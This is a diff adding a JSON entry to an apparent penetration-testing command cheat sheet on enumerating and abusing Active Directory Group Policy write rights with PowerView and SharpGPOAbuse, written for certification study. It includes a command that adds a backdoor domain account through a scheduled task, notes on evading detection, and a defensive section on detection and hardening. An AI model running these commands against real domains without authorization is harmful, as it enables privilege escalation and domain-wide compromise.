@@ -1,0 +1,87 @@
+{
+  "id": "ad-gpo-enum",
+  "name": "PowerView - Enumerate GPO Permissions",
+  "command": "Get-DomainGPO | select displayname\n$sid=Convert-NameToSid \"<user>\"\nGet-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid -and $_.ActiveDirectoryRights -like '*Write*'}",
+  "description": "Enumerates Group Policy Objects (GPOs) and checks if your controlled principal has write rights over any GPO. GPO write access = arbitrary code execution on all machines the GPO applies to (via scheduled tasks, startup scripts, etc.). Often overlooked privilege escalation path. BloodHound shows this more clearly with 'GPO Abuse' queries.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "silent",
+  "category": "Enumeration",
+  "subcategory": "Miscellaneous Misconfigurations",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "gpo",
+    "group-policy",
+    "acl",
+    "powerview",
+    "privilege-escalation"
+  ],
+  "mitre": [
+    "T1484.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY GPO ABUSE IS POWERFUL ===\nGPOs apply settings to all computers in an OU — scheduled tasks, startup scripts,\nregistry changes, user rights assignments. If you have write access to a GPO,\nyou can:\n  1. Add a scheduled task that runs as SYSTEM on every computer in scope\n  2. Add a logon script that runs a payload when any user logs in\n  3. Add yourself or a backdoor account to local Administrators\n  4. Deploy a reverse shell to hundreds of machines simultaneously\n\n=== IDENTIFYING THE BLAST RADIUS ===\nOnce you find a GPO you control:\n  Get-DomainGPOComputerLocalGroupMapping -Identity <gpo_name>  → computers affected\n  Get-DomainOU -GPLink <gpo_guid>  → OUs the GPO is linked to\n  Get-DomainComputer -SearchBase <ou_dn>  → machines in those OUs\n\n=== BLOODHOUND SHORTCUT ===\nBloodHound's query 'Find GPOs where users can modify them' is faster than\nthe PowerView SID filter approach. Also shows the scope (which machines).\n\n=== ABUSE EXAMPLE ===\nSharpGPOAbuse --AddComputerTask --TaskName 'Update' --Author NT AUTHORITY\\SYSTEM \\\n  --Command 'cmd.exe' --Arguments '/c net user hacker Password123! /add /domain' \\\n  --GPOName 'Misconfigured Policy'\n\n=== WHAT -like '*Write*' CATCHES ===\n  GenericWrite, WriteProperty, WriteDACL, WriteOwner on GPO objects.\nAny of these can lead to GPO modification and code execution on scope machines.",
+  "examples": [
+    {
+      "label": "List all GPOs",
+      "command": "Get-DomainGPO | select displayname"
+    },
+    {
+      "label": "Find GPOs where user has write rights",
+      "command": "$sid = Convert-NameToSid 'forend'\nGet-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid -and $_.ActiveDirectoryRights -like '*Write*'}"
+    },
+    {
+      "label": "Find computers a GPO applies to",
+      "command": "Get-DomainGPOComputerLocalGroupMapping -Identity 'Misconfigured Policy'"
+    }
+  ],
+  "references": [
+    {
+      "title": "PowerView (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "SharpGPOAbuse (FSecureLABS)",
+      "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-domainpasswordspray",
+      "rel": "next",
+      "note": "Reuse any recovered credentials."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Group Policy Objects are stored as objects in the domain's Group Policy Container (CN=Policies,CN=System,DC=...) in AD. Any authenticated user can enumerate GPO objects and their discretionary ACLs via LDAP to see which principals have write rights. Write access to a GPO's container (WriteProperty, CreateChild, or GenericWrite) enables modifying the GPO's settings — which are applied to all machines and users in linked OUs, including potentially DCs.",
+    "prerequisites": "Domain membership, PowerShell with PowerView loaded. No elevated privileges for enumeration (only exploitation if write rights found). Get-DomainGPO + Get-DomainObjectAcl for cross-referencing.",
+    "impact": "If write rights found on a GPO linked to DCs or high-privilege workstations: arbitrary code execution on all affected machines via scheduled tasks, startup scripts, or software deployment. GPO write = lateral movement to every machine the GPO covers. Even a workstation-only GPO can enable lateral movement to a wide internal machine footprint.",
+    "detection": "LDAP enumeration of Group Policy Container objects — not specifically logged in default configurations. Actual GPO modification triggers Event 5136 (directory service object modified) with the GPO's GUID. GPO changes are also visible in the Group Policy event log (EventID 4739 in Security log, GPO application events in system log). BloodHound collection generates similar LDAP traffic — difficult to distinguish in isolation.",
+    "prevention": "Audit GPO write delegation using Get-GPPermissions -All and remove any non-admin accounts with write rights. Use dedicated, tiered GPO admin accounts. Separate DC-targeting GPOs from workstation GPOs — an attacker who gains write on a DC-linked GPO achieves domain compromise. Enable AD auditing (SACL) on Group Policy Container objects for modification events (5136). Monitor for unexpected GPO changes via change management processes.",
+    "evasion": "Pure LDAP read of GPO ACLs — no modification triggered, no events generated. Looks identical to BloodHound collection or legitimate admin review.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1484.001"
+    ],
+    "misconfiguration": "Administrative shortcuts create persistent misconfigurations: passwords stored in AD Description/Info attributes (visible to all users), accounts with PasswordNotRequired flag set (blank passwords allowed), LAPS attribute readable by non-admin groups, gMSA readable by unintended principals, or SYSVOL containing scripts with embedded credentials.",
+    "vulnerable_config": "# Passwords in AD Description field:\nGet-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null}\n# Returns: svc_backup  Description: 'Temp password: Welcome1!'\n\n# PasswordNotRequired flag (UAC 0x20 = PASSWD_NOTREQD):\nGet-ADUser -Filter {PasswordNotRequired -eq $true}\n\n# LAPS password readable by Domain Users (misconfigured ACL):\nGet-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,'ms-Mcs-AdmPwd'\n# Should only be readable by admins + specific LAPS readers group",
+    "secure_config": "# Remove passwords from Description/Info fields:\nGet-ADUser -Filter * -Properties Description,Info |\n    Where-Object {$_.Description -match 'pass|pwd|temp|welcome'} |\n    Set-ADUser -Description $null\n\n# Fix PasswordNotRequired accounts:\nGet-ADUser -Filter {PasswordNotRequired -eq $true} |\n    Set-ADAccountControl -PasswordNotRequired $false\n\n# LAPS ACL hardening — restrict ms-Mcs-AdmPwd reads:\n# Only specific LAPS-Readers security group should have Read on this attribute\n# Run: Set-AdmPwdComputerSelfPermission, Set-AdmPwdReadPasswordPermission\n\n# Audit gMSA readers:\nGet-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |\n    Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword"
+  },
+  "tools": [
+    "PowerView"
+  ]
+}
